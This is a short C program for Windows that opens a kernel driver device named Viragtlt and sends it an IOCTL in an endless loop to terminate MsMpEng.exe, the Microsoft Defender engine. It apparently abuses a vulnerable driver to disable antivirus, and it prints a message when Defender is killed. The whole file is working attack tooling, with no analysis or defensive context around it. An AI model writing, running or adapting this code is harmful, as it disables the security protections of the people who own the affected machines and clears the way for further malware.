#include <Windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <stdio.h>

#define KILL_IOCTL_CODE 0x82730030
#define DRIVER_DEVICE L"\\\\.\\Viragtlt"
#define WINDOWS_ENGINE TRUE

int main(int argc, char* argv[]) {
	HANDLE hDriver = CreateFileW(DRIVER_DEVICE, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (!hDriver || hDriver == 0xffffffffffffffff) {
		printf("SymLink unavailable!");
		exit(1);
	}

	DWORD bytesReturned = 0;
	BYTE outBuffer[256];

	while (1) {
		if(WINDOWS_ENGINE) {
			DWORD PID = 0;

			const char targetProcess[] = "MsMpEng.exe";
			BOOL ioctl_result;

			if (PID != -1) {
				ioctl_result = DeviceIoControl(hDriver, KILL_IOCTL_CODE, &targetProcess, sizeof(targetProcess), &outBuffer, 256, &bytesReturned, NULL);
				if (ioctl_result) {
					printf("Defender Must've Died\n");
				}
				else {
					printf("Something botched up :(\n");
				}
			}
			else {
				printf("No Defender Engine found\n");
			}
		}

		Sleep(2000);
	}
}